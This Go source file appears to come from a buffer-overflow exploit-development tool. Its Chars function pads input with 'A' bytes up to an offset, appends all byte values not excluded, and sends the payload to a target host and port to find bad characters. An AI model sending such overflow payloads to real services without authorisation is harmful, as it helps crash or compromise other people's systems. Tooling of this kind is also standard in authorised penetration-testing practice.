package overflow

import (
    "fmt"
    "net"
)

// ...
func Chars(host string, port int, offset int, exclude string, pref,
        suff string) {
    // generate the overflow
    pad := generateBytes(0x41, offset)

    // generate the byte array of characters to send to the target service
    fmt.Println(" > Generating characters.")
    data := append(pad, characters([]byte(exclude))...)

    // build payload 
    fmt.Println(" > Building payload.")
    payload := createPayload(data, pref, suff)

    // send payload to target service
    fmt.Printf(" > Sending %d-byte payload.\n", len(payload))
    err := sendPayload(host, port, payload)

    // notify user of error if one has occurred
    if err != nil {
        fmt.Printf("\n Error! %s\n", err.(*net.OpError).Err)
        return
    }

    // notify user that the payload was successfully delivered
    fmt.Println("\n Success! No errors found.")
}

// ...
func characters(exclude []byte) []byte {
    // ...
    data := make([]byte, 256 - len(exclude))

    // ...
    contains := func(arr []byte, a byte) bool {
        for _, elem := range arr {
            if elem == a {
                return true
            }
        }

        return false
    }

    // ...
    j := 0
    for i := 0; i < 256; i++ {
        if !contains(exclude, byte(i)) {
            data[j] = byte(i)
            j += 1
        }
    }

    return data
}
